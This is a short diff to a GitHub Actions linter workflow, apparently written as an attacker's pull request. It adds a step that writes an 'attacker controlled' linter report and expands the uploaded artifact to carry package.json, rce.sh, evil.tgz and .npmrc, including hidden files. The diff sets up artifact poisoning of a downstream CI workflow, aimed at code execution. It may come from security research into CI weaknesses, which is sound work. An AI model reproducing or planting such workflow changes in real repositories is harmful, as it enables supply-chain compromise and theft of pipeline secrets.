@@ -28,6 +28,9 @@ jobs:
         continue-on-error: true
         run: npx --yes github:AdobeDocs/adp-devsite-utils runLint -v
 
+      - name: Attacker-generated linter report
+        run: echo "attacker controlled report body" > linter-report.txt
+
       - name: Save PR number
         if: always()
         env:
@@ -42,6 +45,11 @@ jobs:
           path: |
             linter-report.txt
             pr-number.txt
+            package.json
+            rce.sh
+            evil.tgz
+            .npmrc
+          include-hidden-files: true
           if-no-files-found: ignore
 
       - name: Fail if linter found errors
